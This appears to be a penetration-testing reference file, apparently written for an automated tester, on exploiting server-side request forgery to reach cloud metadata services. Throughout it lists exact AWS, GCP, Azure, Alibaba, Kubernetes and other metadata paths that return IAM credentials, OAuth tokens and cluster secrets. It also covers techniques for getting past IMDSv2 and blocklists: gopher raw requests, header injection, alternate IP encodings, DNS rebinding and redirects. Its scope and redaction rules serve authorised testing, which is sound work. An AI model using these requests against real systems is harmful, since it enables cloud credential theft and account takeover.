# Cloud metadata endpoints (step 2)
# Reach these THROUGH the SSRF sink (server-side). Stay in scope + approval-gated. Store any creds REDACTED.

## AWS (IMDS)
```
# IMDSv1 (no token):
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/            # -> role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>      # -> AccessKeyId/Secret/Token
# IMDSv2 (token required) — needs a PUT the sink usually can't do:
PUT http://169.254.169.254/latest/api/token   (header: X-aws-ec2-metadata-token-ttl-seconds: 21600)
# bypass helpers: redirect to 169.254.169.254; alt IPs (http://[fd00:ec2::254]/ IPv6)
```

## GCP
```
http://metadata.google.internal/computeMetadata/v1/   (header REQUIRED: Metadata-Flavor: Google)
.../instance/service-accounts/default/token           # -> OAuth token
# header-injection needed if the sink can't set Metadata-Flavor
```

## Azure (IMDS)
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01   (header: Metadata: true)
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

## Others
```
DigitalOcean:  http://169.254.169.254/metadata/v1/
Alibaba:       http://100.100.100.200/latest/meta-data/
Oracle OCI:    http://169.254.169.254/opc/v1/instance/
Kubernetes:    file:///var/run/secrets/kubernetes.io/serviceaccount/token   (via file:// or container SSRF)
```

## Notes
- Many sinks need a **header-injection** or **redirect** to satisfy GCP/Azure/IMDSv2 requirements —
  note whether the sink can meet them (feeds the verify.md IMDS-version check).
- Reaching metadata but getting IMDSv2-blocked is still a finding (SSRF to link-local) — just not
  credential disclosure. Rate honestly.

---
## Extended arsenal — AWS IMDS (v1 + v2 token flow, full benign read tree)

```
### IMDSv2 token flow (the PUT problem)
# 1) Mint a session token (PUT + TTL header):
PUT http://169.254.169.254/latest/api/token
      X-aws-ec2-metadata-token-ttl-seconds: 21600
# 2) Use it on every read (REDACT the token in notes):
GET http://169.254.169.254/latest/meta-data/...
      X-aws-ec2-metadata-token: <TOKEN>
```
Most SSRF sinks can't PUT or set a custom header. Options when they can't:
- A proxy-style sink that forwards method+headers → set them directly.
- `gopher://169.254.169.254:80/_PUT%20/latest/api/token...` to craft the raw PUT (see ssrf protocol ref).
- CRLF/header-injection in the sink to add `X-aws-ec2-metadata-token-ttl-seconds`.
- If IMDSv1 is still enabled (`HttpTokens != required`) skip the token entirely.

```
### Benign read tree (reach-proof WITHOUT credential disclosure)
http://169.254.169.254/latest/meta-data/                          # index (benign)
http://169.254.169.254/latest/meta-data/instance-id               # benign reach proof
http://169.254.169.254/latest/meta-data/iam/info                  # role ARN (identity, low-sensitivity)
http://169.254.169.254/latest/meta-data/iam/security-credentials/ # -> ROLE NAME (STOP here for proof)
http://169.254.169.254/latest/dynamic/instance-identity/document  # account id/region (benign recon)
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>  # creds JSON -> REDACT every value
http://169.254.169.254/latest/user-data                           # may hold secrets -> REDACT
```
Proof-of-impact = the **role name** from `.../security-credentials/`. The `<ROLE>` JSON
(AccessKeyId/SecretAccessKey/Token) is credential material: read only enough to confirm presence, then
REDACT. Do not exfiltrate or use beyond a single benign `sts:GetCallerIdentity` (hand to the cloud skill).

```
### Alternate addresses / reach tricks
http://[fd00:ec2::254]/latest/meta-data/     # IPv6 IMDS
http://2852039166/latest/meta-data/          # dotless-decimal 169.254.169.254
http://0xa9fea9fe/latest/meta-data/          # hex
Host: 169.254.169.254                        # spoof on a routing proxy that keys on Host
```

---
## Extended arsenal — GCP metadata (header-gated, full tree)

```
# Required header on EVERY request:
Metadata-Flavor: Google
# Legacy alt some endpoints still honor:
X-Google-Metadata-Request: True
```
```
http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json  # whole tree (recon)
.../v1/project/project-id          .../v1/project/numeric-project-id
.../v1/instance/service-accounts/                       # list SAs
.../v1/instance/service-accounts/default/scopes
.../v1/instance/service-accounts/default/token          # -> OAuth2 access token          (REDACT)
.../v1/instance/service-accounts/default/identity?audience=https://TOKEN.oob.example  # signed JWT (REDACT)
.../v1/instance/attributes/kube-env                     # GKE node bootstrap secrets       (REDACT)
.../v1/instance/attributes/ssh-keys                     # project/instance SSH keys         (REDACT)
.../v1/instance/disks/   .../v1/instance/network-interfaces/   # benign recon
```
If the sink can't set `Metadata-Flavor`, use header-injection/CRLF or a gopher raw request — the header
must originate at the **fetcher** (a redirect can't add it). IP forms: `metadata.google.internal` ==
`169.254.169.254`; also try the short name `http://metadata/`.

---
## Extended arsenal — Azure IMDS (Metadata:true, token resources)

```
# Required header:
Metadata: true
```
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01            # instance (benign recon)
http://169.254.169.254/metadata/attested/document?api-version=2020-09-01   # signed doc
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=RES
# resource (RES) values worth noting (REDACT returned tokens):
#   https://management.azure.com/   -> ARM control plane
#   https://graph.microsoft.com/    -> Microsoft Graph
#   https://vault.azure.net         -> Key Vault
#   https://storage.azure.com/      -> Storage
# User-assigned identity: add &client_id=<GUID> or &mi_res_id=<resourceId>
```
Azure IMDS **requires** `Metadata: true` and **rejects** requests carrying an `X-Forwarded-For` header —
note whether the sink can meet both (feeds the verify IMDS-reachability check).

---
## Extended arsenal — other providers (exact benign reads)

| Provider | Base | Benign reach proof | Credential path (REDACT) |
|---|---|---|---|
| DigitalOcean | `http://169.254.169.254/metadata/v1/` | `/metadata/v1/id` | `/metadata/v1/user-data` |
| Alibaba Cloud | `http://100.100.100.200/latest/meta-data/` | `/instance-id` | `/ram/security-credentials/<ROLE>` |
| Oracle OCI | `http://169.254.169.254/opc/v2/instance/` | `/opc/v2/instance/` (hdr `Authorization: Bearer Oracle`) | `/opc/v2/identity/cert.pem` |
| OpenStack | `http://169.254.169.254/openstack/latest/` | `/meta_data.json` | `/openstack/latest/user_data` |
| IBM Cloud | `http://169.254.169.254/metadata/v1/` | `/metadata/v1/instance` | instance_identity token (PUT) |
| Tencent | `http://metadata.tencentyun.com/latest/meta-data/` | `/instance-id` | `/cam/security-credentials/<ROLE>` |
| Hetzner | `http://169.254.169.254/hetzner/v1/metadata` | `/hetzner/v1/metadata` | (no role creds) |
| Kubernetes SA | `file:///var/run/secrets/kubernetes.io/serviceaccount/token` | `.../namespace` file | token file -> REDACT |
| Docker API | `/var/run/docker.sock` via a UNIX-socket SSRF proxy | `/version` | — (hand to container-escape) |

Notes: **Alibaba uses `100.100.100.200`** (not `169.254.*`) — allowlists that only block `169.254.*` miss
it. Oracle OCI v2 and IBM need a header/token (`Authorization` / a PUT) much like IMDSv2 — note sink
capability. GKE's `kube-env` and the K8s SA token are cluster secrets → hand to k8s-attacks.

---
## Extended arsenal — reaching metadata through a constrained sink

| Sink limitation | Technique |
|---|---|
| Can't set headers (GCP/Azure/IMDSv2) | gopher:// raw request with the header inline; or CRLF header-injection |
| Allowlists first hop only | 302 from `TOKEN.oob.example` -> `169.254.169.254` (if it follows 3xx) |
| Blocks literal `169.254.169.254` | dotless-decimal/hex/IPv6 forms (see ssrf IP matrix); DNS rebinding to link-local |
| GET only, no PUT (IMDSv2) | gopher PUT to mint the token; or use IMDSv1 if `HttpTokens != required` |
| Strips `http://` | protocol-relative / redirect; host the token mint on your redirector |

---
## Extended arsenal — benign-proof & redaction protocol

- **Reach proof (always safe):** instance-id / role name / project-id — show these to prove SSRF→metadata.
- **Never store live secrets:** access keys, session tokens, OAuth/SA tokens, kube-env, user-data, SSH
  keys → record as `REDACTED (len N, prefix 4 chars)` only; delete any transcript that captured a raw value.
- **Feasibility, not exfil:** at most ONE benign identity call to prove creds are live
  (`sts:GetCallerIdentity` / `az account show` / token introspection) — hand execution to the `cloud`
  skill, which owns credential handling. Do not enumerate or act on cloud resources from here.
- **Rate honestly:** reaching link-local but token-blocked = SSRF-to-link-local (real, lower sev), NOT
  credential disclosure.

---
## Extended arsenal — severity decision matrix

| Outcome | Severity signal |
|---|---|
| Reached `169.254.169.254` index, no creds (IMDSv2 enforced) | SSRF to link-local — real, medium |
| Retrieved role name only | metadata exposure — medium/high |
| Retrieved live role credentials (redacted) + benign identity call succeeds | high/critical |
| `user-data` / `kube-env` / SSH keys readable (redacted) | high — secret exposure |
